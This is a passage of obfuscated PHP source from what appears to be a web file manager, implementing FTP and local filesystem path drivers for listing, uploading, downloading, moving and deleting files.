(substr($Şû²Êî‘, 0, 2) == $‰ãˆ¡­Û[1373]) { $Şû²Êî‘ = BASIC_PATH . substr($Şû²Êî‘, 2); } $©ÃˆÚéº = KodIO::clear($©ÃˆÚéº); $Şû²Êî‘ = KodIO::clear($Şû²Êî‘); $Şû²Êî‘ = substr($Şû²Êî‘, strlen($©ÃˆÚéº)); if (empty($this->pathDriver)) { return $Şû²Êî‘; } return $this->pathDriver . $‰ãˆ¡­Û[8] . ltrim($Şû²Êî‘, $‰ãˆ¡­Û[8]); } private function _init($¸î§ = array()) { $ˆ³íà€À =& $_SERVER[–Ú¬çÁ]; if (!function_exists($ˆ³íà€À[1374])) { throw new Exception(LNG($ˆ³íà€À[1375])); } $this->config = $¸î§; $this->charsetReset($¸î§); foreach ($¸î§ as $­ıÅ¾õæ => $İ™Äú£ì) { if (isset($this->{$­ıÅ¾õæ})) { $this->{$­ıÅ¾õæ} = $İ™Äú£ì; } } return $this->_login($¸î§); } private function _login($¯üÇÖÚÌ) { $¬¨³ñó =& $_SERVER[–Ú¬çÁ]; static $ÀÀŒ¿ÆÛ = array(); $›¶ùĞ·Ş = md5(json_encode($¯üÇÖÚÌ)); if (isset($ÀÀŒ¿ÆÛ[$›¶ùĞ·Ş])) { foreach ($ÀÀŒ¿ÆÛ[$›¶ùĞ·Ş] as $Üù´‹ => $¢øĞ·öø) { $this->{$Üù´‹} = $¢øĞ·öø; } return !0; } $’õä¶Ç§ = parse_url(trim($this->server, $¬¨³ñó[8])); $this->host = $’õä¶Ç§[$¬¨³ñó[196]]; $öÄ†úê¿ = isset($’õä¶Ç§[$¬¨³ñó[195]]) && $’õä¶Ç§[$¬¨³ñó[195]] == $¬¨³ñó[1376] ? !0 : !1; $this->scheme = $öÄ†úê¿ ? $¬¨³ñó[1377] : $¬¨³ñó[1378]; $this->port = isset($’õä¶Ç§[$¬¨³ñó[197]]) ? $’õä¶Ç§[$¬¨³ñó[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $êÂ€àú„ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ìªÌçŠı = $this->pasv == $¬¨³ñó[88] ? !0 : !1; @ftp_pasv($this->connect, $ìªÌçŠı); $ÀÀŒ¿ÆÛ[$›¶ùĞ·Ş] = array($¬¨³ñó[1379] => $this->connect, $¬¨³ñó[196] => $this->host, $¬¨³ñó[195] => $this->scheme, $¬¨³ñó[197] => $this->port); return $êÂ€àú„; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ÇŠ±éÅÎ, $ë¥à–Ú­ = '', $å„€ÚÁ” = REPEAT_RENAME) { if ($this->setContent($ÇŠ±éÅÎ, $ë¥à–Ú­)) { return $this->getPathOuter($ÇŠ±éÅÎ); } return !1; } public function mkdir($ ×…¯ˆ, $ÖÄØáÖÆ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ ×…¯ˆ = $this->iconvSystem($ ×…¯ˆ); if ($this->_isFolder($ ×…¯ˆ) || @ftp_mkdir($this->connect, $ ×…¯ˆ)) { return $this->getPathOuter($ ×…¯ˆ); } if (!$this->mkdir($this->pathFather($ ×…¯ˆ))) { return !1; } if ($ ×…¯ˆ = @ftp_mkdir($this->connect, $ ×…¯ˆ)) { return $this->getPathOuter($ ×…¯ˆ); } return !1; } public function copyFile($ŸæÎÏÑ, $ÃÇ–Õ¾õ) { if (!$this->_isconn()) { return !1; } $„äøğĞ‚ = $this->pathThis($this->iconvSystem($ŸæÎÏÑ)); $½ÕÆÇÜÊ = $this->tempFile($„äøğĞ‚); $Çêò¼“ = $this->iconvApp($½ÕÆÇÜÊ); $this->download($ŸæÎÏÑ, $Çêò¼“); $«ë„ßƒò = $this->upload($ÃÇ–Õ¾õ, $Çêò¼“); $this->tempFileRemve($½ÕÆÇÜÊ); return $«ë„ßƒò; } public function moveFile($±°¼Ù×ö, $ÕúÑ¾») { if (!$this->_isconn()) { return !1; } $±°¼Ù×ö = $this->iconvSystem($±°¼Ù×ö); $ÕúÑ¾» = $this->iconvSystem($ÕúÑ¾»); $šÜ–š¶² = @ftp_rename($this->connect, $±°¼Ù×ö, $ÕúÑ¾»); return $šÜ–š¶² ? $this->getPathOuter($ÕúÑ¾») : !1; } public function delFile($µóÏ×¤) { if (!$this->_isconn()) { return !1; } $µóÏ×¤ = $this->iconvSystem($µóÏ×¤); return @ftp_delete($this->connect, $µóÏ×¤); } public function delFolder($ñçÅÂˆ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $â’•Ì“ = $ÈòßˆÆó = array(); $this->fileList($ñçÅÂˆ, $â’•Ì“, $ÈòßˆÆó, !0); $this->listItemCache = !0; foreach ($ÈòßˆÆó as $â™·´Ê¦) { $ÒŸ¢øÉğ = $this->iconvSystem($â™·´Ê¦[$_SERVER[–Ú¬çÁ][32]]); $ƒ«¨Óè = @ftp_delete($this->connect, $ÒŸ¢øÉğ); if (!$ƒ«¨Óè) { return !1; } } foreach ($â’•Ì“ as $ÒŸ¢øÉğ) { $ÒŸ¢øÉğ = $this->iconvSystem($ÒŸ¢øÉğ); $ƒ«¨Óè = @ftp_rmdir($this->connect, $ÒŸ¢øÉğ); if (!$ƒ«¨Óè) { return !1; } } $ñçÅÂˆ = $this->iconvSystem($ñçÅÂˆ); return @ftp_rmdir($this->connect, $ñçÅÂˆ); } public function rename($®²¨Õ, $•ö¥Â®š) { $æ„¼‹„÷ =& $_SERVER[–Ú¬çÁ]; if (!$this->_isconn()) { return !1; } $ÄŒı´‚„ = $this->fileNameAuto($this->pathFather($®²¨Õ), $•ö¥Â®š); $ÄŒı´‚„ = $this->iconvSystem($ÄŒı´‚„); $®²¨Õ = $this->iconvSystem($®²¨Õ); $æï¸Ò·š = $this->pathFather($®²¨Õ); $²¬í‚Ëü = rtrim($æï¸Ò·š, $æ„¼‹„÷[8]) . $æ„¼‹„÷[8] . $ÄŒı´‚„; $—ÕáÄ±– = @ftp_rename($this->connect, $®²¨Õ, $²¬í‚Ëü); $²¬í‚Ëü = $this->iconvApp($²¬í‚Ëü); return $—ÕáÄ±– ? $this->getPathOuter($²¬í‚Ëü) : !1; } private function folderInfo($ãåÍû±Æ, $¹»ãç­ì = false) { $Ç—®õ®À =& $_SERVER[–Ú¬çÁ]; $€ºıß˜ñ = array($Ç—®õ®À[32] => $this->pathThis($ãåÍû±Æ), $Ç—®õ®À[84] => $this->getPathOuter($Ç—®õ®À[8] . $ãåÍû±Æ), $Ç—®õ®À[33] => $Ç—®õ®À[75]); if ($¹»ãç­ì) { return $€ºıß˜ñ; } $€ºıß˜ñ[$Ç—®õ®À[225]] = $€ºıß˜ñ[$Ç—®õ®À[85]] = 0; $€ºıß˜ñ[$Ç—®õ®À[226]] = $€ºıß˜ñ[$Ç—®õ®À[227]] = !0; return $€ºıß˜ñ; } private function fileInfo($ëãÇŠ´Ç, $ëõ’¿Â = false, $å®ÓË—¹ = array()) { $å™ëí´Ü =& $_SERVER[–Ú¬çÁ]; $×µì = array($å™ëí´Ü[32] => $this->pathThis($ëãÇŠ´Ç), $å™ëí´Ü[84] => $this->getPathOuter($å™ëí´Ü[8] . $ëãÇŠ´Ç), $å™ëí´Ü[33] => $å™ëí´Ü[224], $å™ëí´Ü[76] => isset($å®ÓË—¹[$å™ëí´Ü[76]]) ? $å®ÓË—¹[$å™ëí´Ü[76]] : 0, $å™ëí´Ü[175] => $this->ext($ëãÇŠ´Ç)); if ($ëõ’¿Â) { return $×µì; } $×µì[$å™ëí´Ü[225]] = $×µì[$å™ëí´Ü[85]] = 0; $×µì[$å™ëí´Ü[226]] = $×µì[$å™ëí´Ü[227]] = !0; $·Œ’¥Î„ = $this->iconvSystem($ëãÇŠ´Ç); $×µì[$å™ëí´Ü[85]] = @ftp_mdtm($this->connect, $·Œ’¥Î„); if (empty($å®ÓË—¹)) { $å®ÓË—¹ = $this->objectMeta($ëãÇŠ´Ç); if (!$å®ÓË—¹) { return $×µì; } } $×µì[$å™ëí´Ü[76]] = $å®ÓË—¹[$å™ëí´Ü[76]]; return $×µì; } public function size($Èî™‡¡ñ) { $Ä® ÂŠ“ = $this->objectMeta($Èî™‡¡ñ); return $Ä® ÂŠ“ ? $Ä® ÂŠ“[$_SERVER[–Ú¬çÁ][76]] : 0; } public function info($µÉóúäˆ) { if ($this->isFile($µÉóúäˆ)) { return $this->fileInfo($µÉóúäˆ, 0); } else { if ($this->isFolder($µÉóúäˆ)) { return $this->folderInfo($µÉóúäˆ); } } return !1; } private function fileList($„®»ğÜ•, &$õ…ƒ©€ö, &$¾÷ú°Áœ, $êúé«÷Ø = false) { $‡Ì®Å¯ =& $_SERVER[–Ú¬çÁ]; $„®»ğÜ• = $this->iconvSystem($„®»ğÜ•); if (!$this->isFolder($„®»ğÜ•)) { return !1; } @ftp_chdir($this->connect, $‡Ì®Å¯[8]); $„®»ğÜ• = rtrim($„®»ğÜ•, $‡Ì®Å¯[8]) . $‡Ì®Å¯[8]; check_abort(); $Õß¶ˆùä = @ftp_rawlist($this->connect, $„®»ğÜ•); if (!$Õß¶ˆùä) { $Õß¶ˆùä = array(); } $ÓğÎÒ£ = array($‡Ì®Å¯[10] => 1, $‡Ì®Å¯[1298] => 1); foreach ($Õß¶ˆùä as $ñ´¼ÙŠ) { $ª–ÍåÚæ = $this->_listItem($ñ´¼ÙŠ); if ($ª–ÍåÚæ[0] == $‡Ì®Å¯[778]) { continue; } $²õÒ—°ë = $ª–ÍåÚæ[8]; if (empty($²õÒ—°ë) && $²õÒ—°ë !== $‡Ì®Å¯[222] || isset($ÓğÎÒ£[$²õÒ—°ë])) { continue; } $²õÒ—°ë = $this->iconvApp($„®»ğÜ• . ltrim($²õÒ—°ë, $‡Ì®Å¯[8])); $‚ÆŒâË = array($‡Ì®Å¯[32] => $²õÒ—°ë, $‡Ì®Å¯[33] => $‡Ì®Å¯[224], $‡Ì®Å¯[76] => $ª–ÍåÚæ[4]); if (substr($ñ´¼ÙŠ, 0, 1) == $‡Ì®Å¯[1380]) { $‚ÆŒâË[$‡Ì®Å¯[33]] = $‡Ì®Å¯[75]; $‚ÆŒâË[$‡Ì®Å¯[76]] = 0; } $…ÑË°ºÄ = $‚ÆŒâË[$‡Ì®Å¯[33]] == $‡Ì®Å¯[75] ? !0 : !1; $this->cacheMethodInfoSet($²õÒ—°ë, $…ÑË°ºÄ, $‚ÆŒâË); if ($…ÑË°ºÄ) { $õ…ƒ©€ö[] = $²õÒ—°ë; if ($êúé«÷Ø) { $this->fileList($²õÒ—°ë, $õ…ƒ©€ö, $¾÷ú°Áœ, $êúé«÷Ø); } continue; } $¾÷ú°Áœ[] = $‚ÆŒâË; } $this->cacheMethodInfoSet($„®»ğÜ•, !0); } private function _listItem($×öƒäƒé) { if (empty($×öƒäƒé)) { return array(); } $ÎêÓ¯Ÿ² = preg_split($_SERVER[–Ú¬çÁ][1381], $×öƒäƒé); if (count($ÎêÓ¯Ÿ²) <= 9) { return $ÎêÓ¯Ÿ²; } $ÎêÓ¯Ÿ²[8] = trim(substr($×öƒäƒé, strpos($×öƒäƒé, $ÎêÓ¯Ÿ²[7]) + strlen($ÎêÓ¯Ÿ²[7]))); return array_splice($ÎêÓ¯Ÿ², 0, 9); } public function listPath($³®ä¹š–, $¿ÔÛúÆò = false) { $Îªİ’¦× =& $_SERVER[–Ú¬çÁ]; if (!$this->_isconn()) { return !1; } $ÍğÔ¹ô… = $ÎËĞû‰ü = array(); $this->fileList($³®ä¹š–, $ÍğÔ¹ô…, $ÎËĞû‰ü); foreach ($ÍğÔ¹ô… as $Ù¹å˜¥Ê => $…“’›â®) { $ÍğÔ¹ô…[$Ù¹å˜¥Ê] = $this->folderInfo($…“’›â®, $¿ÔÛúÆò); } foreach ($ÎËĞû‰ü as $Ù¹å˜¥Ê => $…“’›â®) { $ÎËĞû‰ü[$Ù¹å˜¥Ê] = $this->fileInfo($…“’›â®[$Îªİ’¦×[32]], $¿ÔÛúÆò, $…“’›â®); } return array($Îªİ’¦×[82] => $ÍğÔ¹ô…, $Îªİ’¦×[83] => $ÎËĞû‰ü); } public function has($ƒÄİ¿·, $“ù¿ùñô = false, $Ø²ıëñŸ = true) { $Óíø¨¸Ï =& $_SERVER[–Ú¬çÁ]; $Š¶íûÌ¢ = $Ü¾À…ãô = array(); $Õ÷½™Ê¿ = $“ù¿ùñô ? !0 : !1; $this->fileList($ƒÄİ¿·, $Š¶íûÌ¢, $Ü¾À…ãô, $Õ÷½™Ê¿); if ($“ù¿ùñô) { return array($Óíø¨¸Ï[233] => count($Ü¾À…ãô), $Óíø¨¸Ï[234] => count($Š¶íûÌ¢)); } if ($Ø²ıëñŸ) { if (count($Ü¾À…ãô)) { return !0; } } else { if (count($Š¶íûÌ¢)) { return !0; } } return !1; } public function listAll($á¬É¼¢») { $”‹’ÈË =& $_SERVER[–Ú¬çÁ]; if (!$this->_isconn()) { return !1; } $Õ·Ùî²î = $º‘ƒğ· = array(); $this->fileList($á¬É¼¢», $Õ·Ùî²î, $º‘ƒğ·, !0); $®ù”Î¬ = array_to_keyvalue($º‘ƒğ·, $”‹’ÈË[32]); foreach ($Õ·Ùî²î as $ÎìèÚÒó) { if (is_string($ÎìèÚÒó)) { $®ù”Î¬[$ÎìèÚÒó] = array($”‹’ÈË[76] => 0); } } return $this->listAllFiles($á¬É¼¢», $®ù”Î¬); } public function getContent($öÔÊôò¢) { if (!$this->_isconn()) { return !1; } $öÔÊôò¢ = $this->iconvSystem($öÔÊôò¢); return $this->fileSubstr($öÔÊôò¢); } public function setContent($ï©·áËõ, $†à¢Ã÷ñ = '') { if (!$this->_isconn()) { return !1; } $’×ï¬ÈÓ = $this->pathThis($this->iconvSystem($ï©·áËõ)); $ÌÆÏõœ× = $this->tempFile($’×ï¬ÈÓ); file_put_contents($ÌÆÏõœ×, $†à¢Ã÷ñ); $Ççèı´ = $this->upload($ï©·áËõ, $this->iconvApp($ÌÆÏõœ×)); $this->tempFileRemve($ÌÆÏõœ×); return $Ççèı´; } public function fileSubstr($«ò›×¤¹, $¼ÎÕë«ó = 0, $è”©¬¦Õ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($«ò›×¤¹, $¼ÎÕë«ó, $è”©¬¦Õ); } private function ftpRequest($å‹Ô¼ÚÖ, $«€Íõ²Õ = 0, $°œ¤÷Õ† = false) { $å‹Ô¼ÚÖ = $this->iconvSystem($å‹Ô¼ÚÖ); $ÚûÂ¶ = $this->scheme . $this->host . $_SERVER[–Ú¬çÁ][4] . $this->port; $ºûŞŠÃ = curl_init(); curl_setopt($ºûŞŠÃ, CURLOPT_URL, $ÚûÂ¶ . $this->pathEncode($å‹Ô¼ÚÖ)); curl_setopt($ºûŞŠÃ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($°œ¤÷Õ†) { $Œå´Ÿ±‘ = $«€Íõ²Õ + $°œ¤÷Õ† - 1; curl_setopt($ºûŞŠÃ, CURLOPT_RANGE, "{$«€Íõ²Õ}\x2d{$Œå´Ÿ±‘}"); } curl_setopt($ºûŞŠÃ, CURLOPT_RETURNTRANSFER, 1); $ÖïÜ²Åş = curl_exec($ºûŞŠÃ); curl_close($ºûŞŠÃ); return $ÖïÜ²Åş; } public function upload($Ëø€Óİ´, $îøº†²«, $•…àµ‡Ü = false, $ú¢ëéƒ£ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ëø€Óİ´))) { return !1; } $Ëø€Óİ´ = $this->iconvSystem($Ëø€Óİ´); $îøº†²« = $this->iconvSystem($îøº†²«); $”Ù¾Çè = ftp_nb_put($this->connect, $Ëø€Óİ´, $îøº†²«, FTP_BINARY); while ($”Ù¾Çè == FTP_MOREDATA) { $”Ù¾Çè = ftp_nb_continue($this->connect); } if ($”Ù¾Çè != FTP_FINISHED) { return !1; } return $this->getPathOuter($Ëø€Óİ´); } public function download($íÔÆ†ùŠ, $ò²İŠ—† = '') { if (!$this->_isconn()) { return !1; } $ºå¿¬¾¿ = $this->pathFather($ò²İŠ—†); if (!IO::mkdir($ºå¿¬¾¿)) { return !1; } $íÔÆ†ùŠ = $this->iconvSystem($íÔÆ†ùŠ); $ò²İŠ—† = $this->iconvSystem($ò²İŠ—†); $£å™Æ±  = ftp_nb_get($this->connect, $ò²İŠ—†, $íÔÆ†ùŠ, FTP_BINARY); while ($£å™Æ±  == FTP_MOREDATA) { $£å™Æ±  = ftp_nb_continue($this->connect); } if ($£å™Æ±  != FTP_FINISHED) { return !1; } return $this->iconvApp($ò²İŠ—†); } public function exist($³ïŞˆÆŸ) { return $this->isFile($³ïŞˆÆŸ) || $this->isFolder($³ïŞˆÆŸ); } public function isFile($ÔÈ÷ÙŠÌ) { return !$this->isFolder($ÔÈ÷ÙŠÌ) && $this->objectMeta($ÔÈ÷ÙŠÌ); } public function isFolder($„¥Ğ¸§) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][166], $„¥Ğ¸§); } protected function objectMeta($óå€º¼š) { return $this->cacheMethod($_SERVER[–Ú¬çÁ][168], $óå€º¼š); } protected function _objectMeta($öœóÄ‹Š) { $¶œ§öºõ =& $_SERVER[–Ú¬çÁ]; if ($öœóÄ‹Š == $¶œ§öºõ[12] || $öœóÄ‹Š == $¶œ§öºõ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $öœóÄ‹Š = $this->iconvSystem($öœóÄ‹Š); $«Ì·ù©œ = array($¶œ§öºõ[32] => $this->iconvApp($öœóÄ‹Š), $¶œ§öºõ[33] => $¶œ§öºõ[224], $¶œ§öºõ[76] => 0); @ftp_chdir($this->connect, $¶œ§öºõ[8]); $íãŒºñ = @ftp_size($this->connect, $öœóÄ‹Š); if ($íãŒºñ != -1) { $«Ì·ù©œ[$¶œ§öºõ[76]] = $íãŒºñ; } else { $Á»¶”¥ì = @ftp_chdir($this->connect, $öœóÄ‹Š); if (!$Á»¶”¥ì) { return !1; } $«Ì·ù©œ[$¶œ§öºõ[33]] = $¶œ§öºõ[75]; } return $«Ì·ù©œ; } protected function _isFolder($ªÚúá›) { $Éåí¿„ =& $_SERVER[–Ú¬çÁ]; if ($ªÚúá› == $Éåí¿„[12] || $ªÚúá› == $Éåí¿„[8]) { return !0; } $üôÅø„ñ = $this->_objectMeta($ªÚúá›); return isset($üôÅø„ñ[$Éåí¿„[33]]) && $üôÅø„ñ[$Éåí¿„[33]] == $Éåí¿„[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ç‘ŞºŒÖ) { if (substr($Ç‘ŞºŒÖ, 0, 2) == $_SERVER[–Ú¬çÁ][1373]) { $Ç‘ŞºŒÖ = BASIC_PATH . substr($Ç‘ŞºŒÖ, 2); } return $Ç‘ŞºŒÖ; } public function iconvApp($ÏşøäŸË) { $™øÙ±‰ =& $_SERVER[–Ú¬çÁ]; global $config; return $this->iconvTo($ÏşøäŸË, $config[$™øÙ±‰[1371]], $config[$™øÙ±‰[1370]]); } public function iconvSystem($»‹«­çÑ) { $‘éÈ®ÓÔ =& $_SERVER[–Ú¬çÁ]; global $config; return $this->iconvTo($»‹«­çÑ, $config[$‘éÈ®ÓÔ[1370]], $config[$‘éÈ®ÓÔ[1371]]); } public function getPathOuter($¯ö¯´Ï‘) { $œ½Œ =& $_SERVER[–Ú¬çÁ]; $ı¥¤ø = $this->iconvApp($this->pathBase); $¯ö¯´Ï‘ = $this->iconvApp($¯ö¯´Ï‘); if (substr($ı¥¤ø, 0, 2) == $œ½Œ[1373]) { $ı¥¤ø = BASIC_PATH . substr($ı¥¤ø, 2); } if (substr($¯ö¯´Ï‘, 0, 2) == $œ½Œ[1373]) { $¯ö¯´Ï‘ = BASIC_PATH . substr($¯ö¯´Ï‘, 2); } $ı¥¤ø = KodIO::clear($ı¥¤ø); $¯ö¯´Ï‘ = KodIO::clear($¯ö¯´Ï‘); $¯ö¯´Ï‘ = substr($¯ö¯´Ï‘, strlen($ı¥¤ø)); if (empty($this->pathDriver)) { return $¯ö¯´Ï‘; } return $this->pathDriver . $œ½Œ[8] . ltrim($¯ö¯´Ï‘, $œ½Œ[8]); } public function mkfile($˜ÑÕş¹ã, $¬®¬Â¯ª = '', $ˆôéİ  = REPEAT_RENAME) { $˜ÑÕş¹ã = $this->iconvSystem($˜ÑÕş¹ã); @touch($˜ÑÕş¹ã); if ($¬®¬Â¯ª) { file_put_contents($˜ÑÕş¹ã, $¬®¬Â¯ª); } @chmod($˜ÑÕş¹ã, $this->pathAuth); return is_file($˜ÑÕş¹ã) ? $this->getPathOuter($˜ÑÕş¹ã) : !1; } public function mkdir($®­Ë—›È, $€í®Í­× = REPEAT_SKIP) { $®­Ë—›È = $this->iconvSystem($®­Ë—›È); if (is_dir($®­Ë—›È)) { return $this->getPathOuter($®­Ë—›È); } @mkdir($®­Ë—›È, $this->pathAuth, !0); @chmod($®­Ë—›È, $this->pathAuth); return is_dir($®­Ë—›È) ? $this->getPathOuter($®­Ë—›È) : !1; } public function copyFile($„ÔÒõÓ, $åÆîšÛ) { $this->mkdir($this->pathFather($åÆîšÛ)); $„ÔÒõÓ = $this->iconvSystem($„ÔÒõÓ); $åÆîšÛ = $this->iconvSystem($åÆîšÛ); $ãò²‹ªş = copy_64($„ÔÒõÓ, $åÆîšÛ); @chmod($åÆîšÛ, $this->pathAuth); return $ãò²‹ªş ? $this->getPathOuter($åÆîšÛ) : !1; } public function moveFile($Š­ÉŸÂ, $ ¾‘¤÷²) { $this->mkdir($this->pathFather($ ¾‘¤÷²)); $Š­ÉŸÂ = $this->iconvSystem($Š­ÉŸÂ); $ ¾‘¤÷² = $this->iconvSystem($ ¾‘¤÷²); $šºŸØ¥ = intval(@rename($Š­ÉŸÂ, $ ¾‘¤÷²)); if (!$šºŸØ¥) { if ($šºŸØ¥ = intval(@copy_64($Š­ÉŸÂ, $ ¾‘¤÷²))) { @unlink($Š­ÉŸÂ); } } @chmod($ ¾‘¤÷², $this->pathAuth); return $šºŸØ¥ ? $this->getPathOuter($ ¾‘¤÷²) : !1; } public function movePath($É‡‹©˜¡, $ÄÔ¦‡¸ß, $ğÊÈåËá = false) { $³ÆäˆÒ„ =& $_SERVER[–Ú¬çÁ]; $É‡‹©˜¡ = $this->iconvSystem($É‡‹©˜¡); $ÄÔ¦‡¸ß = $this->iconvSystem($ÄÔ¦‡¸ß); $õ³öÙÑ = rtrim($ÄÔ¦‡¸ß, $³ÆäˆÒ„[8]) . $³ÆäˆÒ„[8] . ($ğÊÈåËá ? $ğÊÈåËá : get_path_this($É‡‹©˜¡)); if (file_exists($õ³öÙÑ)) { return !1; } $åëÚ¿ï = intval(@rename($É‡‹©˜¡, $õ³öÙÑ)); $åëÚ¿ï = file_exists($õ³öÙÑ); return $åëÚ¿ï ? $this->getPathOuter($õ³öÙÑ) : !1; } public function delFile($©›Ã»Œ›) { $©›Ã»Œ› = $this->iconvSystem($©›Ã»Œ›); if (!@unlink($©›Ã»Œ›)) { @chmod($©›Ã»Œ›, $this->pathAuth); if (!@unlink($©›Ã»Œ›)) { return !1; } } else { return !0; } } public function delFolder($Õ—Õ¤‘) { $ƒ¡ƒ©Ğ =& $_SERVER[–Ú¬çÁ]; $Õ—Õ¤‘ = $this->iconvSystem($Õ—Õ¤‘); if (!is_dir($Õ—Õ¤‘)) { return !0; } if (!($§ÈÇ›îÚ = opendir($Õ—Õ¤‘))) { return !1; } while (($’ÔôËà = readdir($§ÈÇ›îÚ)) !== !1) { if ($’ÔôËà == $ƒ¡ƒ©Ğ[10] || $’ÔôËà == $ƒ¡ƒ©Ğ[1298]) { continue; } $¤Å™¿¯‚ = $Õ—Õ¤‘ . $ƒ¡ƒ©Ğ[8] . $’ÔôËà; if (is_file($¤Å™¿¯‚) || is_link($¤Å™¿¯‚)) { if (!unlink($¤Å™¿¯‚)) { chmod($¤Å™¿¯‚, $this->pathAuth); if (!unlink($¤Å™¿¯‚)) { return !1; } } } else { if (is_dir($¤Å™¿¯‚)) { chmod($¤Å™¿¯‚, $this->pathAuth); $¤Å™¿¯‚ = $this->iconvApp($¤Å™¿¯‚); if (!$this->delFolder($¤Å™¿¯‚)) { return !1; } } } } closedir($§ÈÇ›îÚ); return rmdir($Õ—Õ¤‘); } public function rename($Í¬Ò™Åº, $¤üÒóÍØ) { $šƒÕêÉœ =& $_SERVER[–Ú¬çÁ]; $Æ¶û‡Îİ = $this->fileNameAuto($this->pathFather($Í¬Ò™Åº), $¤üÒóÍØ); $Æ¶û‡Îİ = $this->iconvSystem($Æ¶û‡Îİ); $Í¬Ò™Åº = $this->iconvSystem($Í¬Ò™Åº); $¾ÓÈê©¦ = $this->pathFather($Í¬Ò™Åº); $Ü‹ŸëŒÌ = rtrim($¾ÓÈê©¦, $šƒÕêÉœ[8]) . $šƒÕêÉœ[8] . $Æ¶û‡Îİ; $şŞşäĞà = @rename($Í¬Ò™Åº, $Ü‹ŸëŒÌ); $Ü‹ŸëŒÌ = $this->iconvApp($Ü‹ŸëŒÌ); return $şŞşäĞà ? $this->getPathOuter($Ü‹ŸëŒÌ) : !1; } public function size($˜¶¿©ƒÙ) { $˜¶¿©ƒÙ = $this->iconvSystem($˜¶¿©ƒÙ); return filesize_64($˜¶¿©ƒÙ); } public function info($ÊØã¿´´) { $ÊØã¿´´ = $this->iconvSystem($ÊØã¿´´); if ($this->isFolder($ÊØã¿´´)) { return $this->folderInfo($ÊØã¿´´); } else { if ($this->isFile($ÊØã¿´´)) { return $this->fileInfo($ÊØã¿´´); } } return !1; } protected function infoChildren($‹½Ñ¥„, &$ºîİÙ°µ, $¬–Î´ù = true) { $ÛëÙ ã =& $_SERVER[–Ú¬çÁ]; check_abort_echo(); $‹½Ñ¥„ = rtrim($‹½Ñ¥„, $ÛëÙ ã[8]) . $ÛëÙ ã[8]; if ($¬–Î´ù) { $‹½Ñ¥„ = $this->iconvSystem($‹½Ñ¥„); } if (!($ßğĞŸˆ = @opendir($‹½Ñ¥„))) { return; } while (($‹àì’Ë¢ = readdir($ßğĞŸˆ)) !== !1) { if ($‹àì’Ë¢ == $ÛëÙ ã[10] || $‹àì’Ë¢ == $ÛëÙ ã[1298]) { continue; } $¥´¸áÃ = $‹½Ñ¥„ . $‹àì’Ë¢; if (is_file($¥´¸áÃ) || is_link($¥´¸áÃ)) { $ºîİÙ°µ[$ÛëÙ ã[77]]++; $ºîİÙ°µ[$ÛëÙ ã[76]] += filesize_64($¥´¸áÃ); } else { if (is_dir($¥´¸áÃ)) { $ºîİÙ°µ[$ÛëÙ ã[78]]++; $this->infoChildren($¥´¸áÃ, $ºîİÙ°µ, !1); } } } closedir($ßğĞŸˆ); } private function folderInfo($Ñ÷ñÄÆÓ, $ÉŞßØÖ = false) { $Œîûò¼« =& $_SERVER[–Ú¬çÁ]; $Ñ÷ñÄÆÓ = rtrim($Ñ÷ñÄÆÓ, $Œîûò¼«[8]) . $Œîûò¼«[8]; $üäëâÀ = $this->iconvApp($this->pathThis($Ñ÷ñÄÆÓ)); if ($ÉŞßØÖ) { return array($Œîûò¼«[32] => $üäëâÀ, $Œîûò¼«[84] => $this->getPathOuter($Ñ÷ñÄÆÓ), $Œîûò¼«[33] => $Œîûò¼«[75]); } $æù‹ººú = array($Œîûò¼«[32] => $üäëâÀ, $Œîûò¼«[84] => $this->getPathOuter($Ñ÷ñÄÆÓ), $Œîûò¼«[33] => $Œîûò¼«[75], $Œîûò¼«[225] => @filectime($Ñ÷ñÄÆÓ), $Œîûò¼«[85] => @filemtime($Ñ÷ñÄÆÓ), $Œîûò¼«[1382] => @fileatime($Ñ÷ñÄÆÓ), $Œîûò¼«[1383] => is_readable($Ñ÷ñÄÆÓ), $Œîûò¼«[1384] => is_writable($Ñ÷ñÄÆÓ), $Œîûò¼«[1385] => get_mode($Ñ÷ñÄÆÓ)); return $æù‹ººú; } private function fileInfo($Ñ¹ïú‘Å, $¥ğ’’“é = false) { $•Ø®ãÓ¸ =& $_SERVER[–Ú¬çÁ]; $¬Èá€®› = $this->iconvApp($this->pathThis($Ñ¹ïú‘Å)); if ($¥ğ’’“é) { return array($•Ø®ãÓ¸[32] => $¬Èá€®›, $•Ø®ãÓ¸[84] => $this->getPathOuter($Ñ¹ïú‘Å), $•Ø®ãÓ¸[33] => $•Ø®ãÓ¸[224], $•Ø®ãÓ¸[76] => $this->size($Ñ¹ïú‘Å), $•Ø®ãÓ¸[175] => $this->ext($¬Èá€®›)); } $˜”¬á“¯ = array($•Ø®ãÓ¸[32] => $¬Èá€®›, $•Ø®ãÓ¸[84] => $this->getPathOuter($Ñ¹ïú‘Å), $•Ø®ãÓ¸[33] => $•Ø®ãÓ¸[224], $•Ø®ãÓ¸[225] => @filectime($Ñ¹ïú‘Å), $•Ø®ãÓ¸[85] => @filemtime($Ñ¹ïú‘Å), $•Ø®ãÓ¸[1382] => @fileatime($Ñ¹ïú‘Å), $•Ø®ãÓ¸[76] => $this->size($Ñ¹ïú‘Å), $•Ø®ãÓ¸[175] => $this->ext($¬Èá€®›), $•Ø®ãÓ¸[1383] => is_readable($Ñ¹ïú‘Å), $•Ø®ãÓ¸[1384] => is_writable($Ñ¹ïú‘Å), $•Ø®ãÓ¸[1385] => get_mode($Ñ¹ïú‘Å)); return $˜”¬á“¯; } public function exist($©’îšœ) { $©’îšœ = $this->iconvSystem($©’îšœ); return @file_exists($©’îšœ); } public function isFile($êäÕÕüÊ) { $êäÕÕüÊ = $this->iconvSystem($êäÕÕüÊ); return @is_file($êäÕÕüÊ); } public function 